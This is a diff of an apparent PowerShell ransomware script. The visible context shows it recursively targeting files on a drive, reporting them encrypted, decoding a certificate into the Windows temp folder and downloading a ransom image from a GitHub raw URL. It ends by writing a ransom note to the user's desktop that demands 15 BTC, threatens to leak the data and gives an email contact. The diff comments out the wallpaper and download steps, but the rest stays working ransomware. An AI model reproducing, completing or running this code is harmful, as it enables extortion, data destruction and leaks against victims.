@@ -297,8 +297,8 @@ foreach ($i in $(Get-ChildItem Z:\ -recurse -include *.*  | ForEach-Object { $_.
 # Invoke-WebRequest -Uri $alert -OutFile "c:/temp/ransom.jpg"
 # Start-Sleep -s 2
 
-$ransom = "https://raw.githubusercontent.com/ecoterror443/filerep/main/ransom.jpg"
-Invoke-WebRequest -Uri $ransom -OutFile "c:/temp/ransom.jpg" | Out-Null
+# $ransom = "https://raw.githubusercontent.com/ecoterror443/filerep/main/ransom.jpg"
+# Invoke-WebRequest -Uri $ransom -OutFile "c:/temp/ransom.jpg" | Out-Null
 
 Write-Host "[+] Target files encrypted..." -ForegroundColor Green
 $encodedcert =  [IO.File]::WriteAllBytes("c:/windows/temp/x.cer", [Convert]::FromBase64String($encodedcert))
@@ -408,7 +408,7 @@ $delay -= 1
 }
 $Form.Close()
 $background = "https://raw.githubusercontent.com/ecoterror443/filerepo/main/ransom.jpg"
-Invoke-WebRequest -Uri $background -OutFile "c:/users/$env:USERNAME/ransom.jpg" | Out-Null
+# Invoke-WebRequest -Uri $background -OutFile "c:/users/$env:USERNAME/ransom.jpg" | Out-Null
 # Start-Sleep -s 2
 <#
 #Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name WallPaper -value ''
@@ -416,13 +416,13 @@ New-ItemProperty -Path "HKCU:\Control Panel\Personalization" -Name "DesktopImage
 New-ItemProperty -Path "HKCU:\Control Panel\Personalization"-Name "DesktopImagePath" -Value "/users/$env:USERNAME/img.png" -PropertyType STRING -Force | Out-Null
 New-ItemProperty -Path "HKCU:\Control Panel\Personalization" -Name "DesktopImageUrl" -Value "/users/$env:USERNAME/img.png" -PropertyType STRING -Force | Out-Null
 #>
-$wallpaper = "C:/users/$env:USERNAME/ransom.jpg"
-Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name Wallpaper -value "$wallpaper"
-Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -value "10"
-Start-Sleep -s 2
-rundll32.exe user32.dll, UpdatePerUserSystemParameters, 1 , $False
+# $wallpaper = "C:/users/$env:USERNAME/ransom.jpg"
+# Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name Wallpaper -value "$wallpaper"
+# Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -value "10"
+# Start-Sleep -s 2
+# rundll32.exe user32.dll, UpdatePerUserSystemParameters, 1 , $False
 
-Stop-Process -ProcessName explorer
+# Stop-Process -ProcessName explorer
 
 echo "We have encrypted your important files. For now, you cannot access these files. Encrypted files have been modified with an extension ""encrypted"". It is possible to recover your files but you need to follow our instructions and pay us before the time runs out. If you do not pay the ransom of 15 BTC these files will be leaked online. The faster you contact us at ecoterror443@gmail.com with the proof of payment, the easier it will be for us to release your files. Your backups were also encrypted and removed. This ransomware encrypts all the files of the hard drive. To decrypt the files please send us the proof of the transfer. Do not try to modify the files extension or else it will destroy the data. If you do not pay the money your sensitive data will be leaked online." > c:/users/$env:USERNAME/desktop/ransom.txt
 #$Form.ShowDialog()
